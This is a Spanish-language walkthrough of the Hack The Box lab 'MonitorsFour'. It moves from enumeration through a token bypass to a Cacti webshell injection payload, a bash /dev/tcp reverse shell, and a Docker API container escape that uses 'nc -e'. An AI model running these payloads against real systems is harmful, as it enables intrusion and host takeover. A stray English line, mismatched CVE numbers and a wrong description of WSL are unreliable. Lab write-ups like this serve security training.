---
title: Monitors Four - Hack The Box
date: 2026-04-06
categories: [HackTheBox,Lab]
tags: [windows,easy,enumeration]     # TAG names should always be lowercase
description: Descripción pendiente...
image:
  path: /assets/images/HTB/MonitorsFour/monitorsfour.png
---

## Enumeración inicial con nmap

Mostramos los puertos abiertos usando la herramienta **nmap**:

`sudo nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- 10.129.29.11 -oG Ports`

![](/assets/images/HTB/MonitorsFour/ports.png)


Y se descubrieron los puertos: 80 y 5985 en su estado open.

---

En base a esos puertos abiertos, enumeramos la versión y servicio que corren bajo esos puertos:

`sudo nmap -sC -sV -p 80,5985 10.129.29.11 -oN targeted`

![](/assets/images/HTB/MonitorsFour/service_version.png)

Detectamos que bajo el puerto 80 corre HTTP, con el servicio nginx y el puerto 5985 corre el servicio HTTP corriendo un objetivo Microsoft (windows).

## Enumeración del servidor web (puerto 80)

Se registraron los siguientes datos del servidor web:

`whatweb http://10.129.29.11/`

![](/assets/images/HTB/MonitorsFour/whatweb.png)

Se muestra que existe un virtual host habilitado bajo el DNS **monitorsfour.htb**, entonces agregamos el nombre de dominio a la ruta del sistema **/etc/hosts**:

![](/assets/images/HTB/MonitorsFour/vhost.png)

Se pudo observar un servidor web funcional corriendo bajo ese nombre de dominio:

![](/assets/images/HTB/MonitorsFour/monitors.png)

---

## Fuzzing de directorios ocultos

Lo que prosiguió fue hacer fuzzing de directorios en la web, esta maquina es dificultad baja, por lo que usamos un diccionario no tan complejo:

`ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u 'http://monitorsfour.htb/FUZZ' -ac `

![](/assets/images/HTB/MonitorsFour/fuzzingDirectorios.png)

- contact
- login
- user
- forgot-password

Obtuvimos 4 rutas, pero de aquí no obtuvimos algo relevante, pero debemos tener en cuenta todo.

> Recuerda, "All the pieces matter" - The wire.

---

## Fuzzing de subdominios

Pasamos a la parte de enumerar los subdominios para verificar si hay alguno en existencia, seguimos usando la herramienta **ffuf** pero esta vez con un diccionario enfocado en subdominios:

`ffuf -w ~/Diccionarios/subdomain_megalist.txt -u 'http://monitorsfour.htb' -H "Host: FUZZ.monitorsfour.htb" -ac`

![](/assets/images/HTB/MonitorsFour/cacti.png)

Localizamos el subdominio llamado **cacti** que ha respondido, por lo que lo agregamos a la ruta **/etc/hosts**:

![](/assets/images/HTB/MonitorsFour/cactihost.png)

Y esto fue lo que mostró dicho subdominio:

![](/assets/images/HTB/MonitorsFour/cacti_login.png)

Cacti es una herramienta de monitoreo de red, la versión instalada es 1.2.28, la cuál es vulnerable a esto:

[CVE-2025-66399](https://github.com/Cacti/cacti/security/advisories/GHSA-fxrq-fr7h-9rqq)

Esta vulnerabilidad requiere una sesión iniciada por algún usuario, en este caso no tenemos una sesión, por lo que buscamos otros modos de entrar.

---

## Fuzzing de APIs en el servidor web

Recurrimos a el escaneo de posibles APIs por medio del fuzzing:

`ffuf -w ~/Diccionarios/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://monitorsfour.htb/FUZZ' -ac`

![](/assets/images/HTB/MonitorsFour/fuzz_api.png)

Detectamos varias rutas, y probandolas la que nos resultó interesante fue **user**:

![](/assets/images/HTB/MonitorsFour/user.png)

Ya que nos arrojaba este mensaje, aquí parece que existe un parametro llamado "token" el cuál necesita recibir un valor para acceder a algo, así que para comprobar que el parametro existe, hicimos un fuzzing bajo ese parametro:

`ffuf -w ~/Diccionarios/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://monitorsfour.htb/user?FUZZ=1' -ac`

Indicando que deseamos escanear un paremetro, por eso se lo indicamos con el '?' segudio del payload FUZZ, está en un valor 1 ya que es probable que siempre exista un valor 1.

Después del fuzzing encontramos lo siguiente:

![](/assets/images/HTB/MonitorsFour/token_parameter.png)

un parametro llamado **token**, al verlo en la web vemos lo siguiente:

![](/assets/images/HTB/MonitorsFour/token1.png)

Al parecer el valor token 1 no es valido pero al menos el servidor acepto la petición, cambiando el valor del token a 0, sucede lo siguiente:

![](/assets/images/HTB/MonitorsFour/cero.png)

## Explicación error de validación del parametro token

**¿Y por qué sucedió esto?**

Supongamos que por el lado de la web existe este código:

```python
if token:
  validate_token(token)  
else:  
  return all_users()
```

En programación no solo el valor "false" signfica que es un valor falso, también existen otros elementos como:

- `0` (el número cero)
- `""` (una cadena vacía)
- `None` / `null` / `undefined`
- `[]` (lista vacía)

Y lo que sucede en el código de la web, es que con el if token, solo pregunta "si el token es verdadero", entonces llama a la función `validate_token()` para ver si ese token es valido, no verifica si realmente existe ese token.

Y como ponemos un "0", el código detecta que el token 0 , es falso, por lo que hace bypass a la función `validate_token()`,  pasandose directamente al else, que devuelve la lista de todos los usuarios.

---

## Vulnerabilidad IDOR

![](/assets/images/HTB/MonitorsFour/hash.png)

Vemos que hay un positivo en el primer hash que aparentemente corresponde al usuario admin.

Pero al intentar acceder nos daba problemas con el usuario, así que notamos en el primer apartado de los datos que obtuvimos:

![](/assets/images/HTB/MonitorsFour/marcus.png)

Que existia otro nombre llamado Marcus Higgins, así que probamos acceder con el usuario Marcus y entramos a la herramienta de cacti con dichas credenciales:

![](/assets/images/HTB/MonitorsFour/cactiaccess.png)

---

##  RCE (WebShell) - CVE-2025–24367

Explotaremos la vulnerabilidad que encontramos ya que tenemos acceso ahora.

Iremos a Templates>Graph y buscamos "Logged in Users":

![](/assets/images/HTB/MonitorsFour/unix.png)

Y en el CVE, nos dice que la parte vulnerable es "Right Axis Label":

![](/assets/images/HTB/MonitorsFour/vuln.png)

En este punto usaremos la herramienta BurpSuite para interceptar esta petición al darle en "save":

![](/assets/images/HTB/MonitorsFour/intercept.png)

Podemos ver la petición interceptada, y el parametro que nos importa es "right_axis_label", cambiaremos el valor "test", procedimos a inyectar la siguiente instrucción:

```
test  
create my.rrd - step 300 DS:temp:GAUGE:600:-273:5000 RRA:AVERAGE:0.5:1:1200  
graph shell.php -s now -a CSV DEF:out=my.rrd:temp:AVERAGE LINE1:out:<?=`$_REQUEST[0]`;?>
```

En la linea de "create my.rrd", creamos una base de datos............

La petición no se puede poner tal como está, ya que esto generaría un error de sintaxis, lo que debemos hacer es URL-encodear los datos:

```
right_axis_label=test%0Acreate+my.rrd+--step+300+DS:temp:GAUGE:600:-273:5000+RRA:AVERAGE:0.5:1:1200%0Agraph+shell.php+-s+now+-a+CSV+DEF:out=my.rrd:temp:AVERAGE+LINE1:out:<?=`$_REQUEST[0]`;?>%0A
```

todo esto es en una sola linea, pero en formato URL-encode.

la petición se verá así:

![](/assets/images/HTB/MonitorsFour/payload.png)

Y el código malicioso que inyectamos creará una Web Shell, pero aún no se ha ejecutado el código, ya que debemos llamar a la gráfica en donde se almacenó el código, por lo que iremos a: Graps>DefaultTree>LocalLinuxMachine buscamos por "Logged in Users":

![](/assets/images/HTB/MonitorsFour/graphicc.png)

Y le damos en el botón para ver la grafica, por detrás el código ha sido interpretado.

![](/assets/images/HTB/MonitorsFour/exx.png)

Y aquí nos cargaran los gráficos, y ahora navegamos a la ruta de nuestro archivo PHP que creamos gracias a la inyección:

`http://cacti.monitorsfour.htb/cacti/shell.php?0=echo "Hi D4nsh"`

![](/assets/images/HTB/MonitorsFour/webshell.png)

Podemos apreciar que logramos obtener acceso a una Web Shell que nos permite ejecutar comandos a nivel de sistema.

## Usando RCE para obtener una reverse Shell

Ahora vamos a obtener una shell directamente en nuestra terminal, para ello nos ponemos en escucha por algún puerto:

`nc -nlvp 4444`:

![](/assets/images/HTB/MonitorsFour/listener.png)

Y en otra sesión de terminal, vamos a crear un archivo llamado bash, que incluirá nuestra shell reversa:

```bash
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.14.254/4444 0>&1
```


![](/assets/images/HTB/MonitorsFour/reverse.png)

Teniendo la reverse shell lista, lo que haremos será iniciar un servidor de archivos compartidos local en la ubicación actual donde se encuentra el archivo "bash", este servidor se pondrá en el puerto 80:

`python -m http.server 80`

![](/assets/images/HTB/MonitorsFour/wait.png)

Vemos que está activo el servidor, esto nos sirve para que usando la Web shell del servidor cacti, poder obtener una shell inversa a nuestro equipo atacante.

![](/assets/images/HTB/MonitorsFour/Get.png)

`curl 10.10.14.254/bash -o /tmp/reverse.sh`

Ahora con curl lo que hicimos fue obtener la bash que creamos en nuestro equipo, y al ver el registro del servidor web local, pudimos confirmar que se descargo en el servidor cacti:
Wait. That hostname `821fbd6a43fa` looks suspicious. That’s a Docker container ID!
![](/assets/images/HTB/MonitorsFour/getcacti.png)

Ahora simplemente debemos ejecutar la shell para recibirla en nuestro puerto en escucha "4444":

`bash /tmp/reverse.sh`

![](/assets/images/HTB/MonitorsFour/execute.png)

Y en nuestro listener netcat, vemos la shell obtenida:

![](/assets/images/HTB/MonitorsFour/nc.png)

---

## Tratamiento TTY a la reverse Shell

Ahora para ir navegando con comodidad, haremos el tratamiento de la TTY para adaptar todo y no tener errores en nuestro entorno:

```
script /dev/null -c bash

CTRL + Z para suspender la Shell

stty raw -echo; fg
	
	reset
reset: unknown terminal type unknown
Terminal type? xterm

export TERM=xterm
export SHELL=bash

```

y la parte de ajustar la resolución de la pantalla:

en una terminal propia, sacamos las dimensiones con: **stty size** y en base a los resultados, las ponemos en la reverse shell:

`stty rows 40 columns 135`

Y ya tenemos nuestro tratamiento de la shell.

---

## Obteniendo un usuario con mayores privilegios

![](/assets/images/HTB/MonitorsFour/container.png)

Podemos apreciar que estamos conectados cómo el usuario www-data, pero seguido de eso tenemos una cadena de valores, esto es un ID de un contendor Docker, así que podemos intuir que estamos dentro de uno.

Procedemos a enumerar el sistema:

![](/assets/images/HTB/MonitorsFour/uname.png)

Estamos frente a un sistema WSL, que es windows for system linux, corre linux en windows sin necesidad de instalar muchas cosas, esto lo hace mediante un contenedor Docker.

Sabiendo esto, intentamos revisar llaves SSH pero estas eran inexistentes en este sistema.

---

## Vulnerabilidad Docker WSL CVE-2025–9074

Enumeramos el entorno para confirmar que estamos dentro de un contenedor:

![](/assets/images/HTB/MonitorsFour/docker.png)

Se confirmo el entorno docker, así que se intento probar si de casualidad se tenía acceso a las APIs de docker haciendo una simple petición a la IP y puerto por defecto que usa docker para dichas API:

`curl http://192.168.65.7:2375/version`

![](/assets/images/HTB/MonitorsFour/apiver.png)

Podemos ver que nos da una respuesta, esto da a entender que el contenedor actual tiene habilitado comunicarse con la API de docker directamente sin proporcionar contraseña de seguridad.

## Creando nuestro contenedor con privilegios

En nuestra maquina local, creamos este archivo .json:

```json
{
  "Image": "alpine:latest",
  "Cmd": ["/bin/sh", "-c", "nc 10.10.15.110 4444 -e /bin/sh"],
  "HostConfig": {
    "Binds": ["/mnt/host/c:/mnt/host_root"]
  },
  "Tty": true,
  "OpenStdin": true
}
```

![](/assets/images/HTB/MonitorsFour/containerjson.png)

Este código básicamente usa la imagen alphine, que es ligera y nos sirve para esto.

En la variable, Cmd, pasamos una ejecución shell que nos ejecutará una reverse shell en netcat a nuestra IP atacante por el puerto 4444.

Ponemos a correr un servidor local de archivos compartidos en python para compartir este archivo con la maquina objetivo.

![](/assets/images/HTB/MonitorsFour/pyserver.png)

Ahora solo está a la espera de captar el archivo, lo siguiente será iniciar el listener con netcat en el puerto 4444:

![](/assets/images/HTB/MonitorsFour/listener2.png)

Después, en la maquina docker, vamos a descargar nuestro .json y almacenarlo en la ruta /tmp:

![](/assets/images/HTB/MonitorsFour/downjson.png)

Ya hemos descargado el .json dentro de nuestra maquina victima:

![](/assets/images/HTB/MonitorsFour/downcont.png)

Ahora solo queda crear un contenedor que nos ejecutará esto:

```bash
curl -X POST \  
  -H "Content-Type: application/json" \  
  -d @/tmp/container.json \  
  http://192.168.65.7:2375/containers/create?name=dannultyx
```


![](/assets/images/HTB/MonitorsFour/dannultyx.png)

Hemos creado nuestro contenedor, y nos ha arrojado un ID.

Este ID lo usaremos para correr nuestro contenedor:

```bash
curl -X POST \  
  http://192.168.65.7:2375/containers/TU_ID/start
```

![](/assets/images/HTB/MonitorsFour/start.png)

Ahora que corre, vemos en el listener, que se ha establecido la conexión como root:

![](/assets/images/HTB/MonitorsFour/root.png)

Con esto hemos terminado esta maquina, MonitorsFour.

## Informe final

IDOR: Se debe sanitizar la entrada de datos en las peticiones, de ser posible cambiar las medidas de seguridad, sobre todo en el código: `if token:` donde encontramos el mayor error, que solo validaba la existencia más no comprobaba el dato.

**Cacti:** Se requiere actualizar a una versión igual o superior a la 1.2.29, en el siguiente enlace se encuentra el reporte oficial: [Cacti RCE](https://github.com/Cacti/cacti/security/advisories/GHSA-c7rr-2h93-7gjf)

**Docker WSL2**: Establecer medidas de seguridad (Contraseñas y permisos de archivos), para evitar la comunicación directa con la API de docker y así evitar escalar privilegios dentro del contenedor.

> Sugerencia: Usar contraseñas más seguras y cambiar las peticiones GET en la web principal por POST.